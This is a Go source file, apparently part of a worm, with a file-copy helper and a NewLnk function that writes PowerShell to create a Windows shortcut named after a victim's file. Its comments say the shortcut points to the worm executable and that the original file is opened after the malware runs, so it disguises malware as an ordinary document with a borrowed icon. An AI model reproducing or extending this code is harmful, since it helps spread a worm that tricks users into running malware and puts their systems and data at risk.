package files

import (
        "fmt"
        "os"
        "io"
)

type File struct {
	name string
}

// `Copy` copies a filename `src`, to filename `dst`
func Copy(src, dst string) (int64, error) {
        sourceFileStat, err := os.Stat(src)
        if err != nil {
                return 0, err
        }

        if !sourceFileStat.Mode().IsRegular() {
                return 0, fmt.Errorf("%s is not a regular file", src)
        }

        source, err := os.Open(src)
        if err != nil {
                return 0, err
        }
        defer source.Close()

        destination, err := os.Create(dst)
        if err != nil {
                return 0, err
        }
        defer destination.Close()
        nBytes, err := io.Copy(destination, source)
        return nBytes, err
}

type LnkFile struct {
        name string
        cmd string
}

func (f LnkFile) Name() (string) {
        return f.name
}

func (f LnkFile) Cmd() (string) {
        return f.cmd
}

// Create an `filename.lnk` for `filename`
// @param targetExe: the exe then LNK should point to (worm)
// @param targetFile: the file we are replacing, ie the file which should be opened after malware runs
func NewLnk(targetExe string, targetFile string) LnkFile{
        name := fmt.Sprintf(`%s.lnk`, targetFile)
        // TODO: define icon type wrt to file type
        // and use IMAGERES.dll instead of SHELL32.dll
        cmd := fmt.Sprintf(`
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut("%s")
$shortcut.TargetPath="%s"
$shortcut.Arguments='"%s"'
$shortcut.IconLocation="C:\Windows\System32\SHELL32.dll,1"
$shortcut.Save()
$shortcut.Save()
`, name, targetExe, targetFile)
        return LnkFile{name, cmd}

}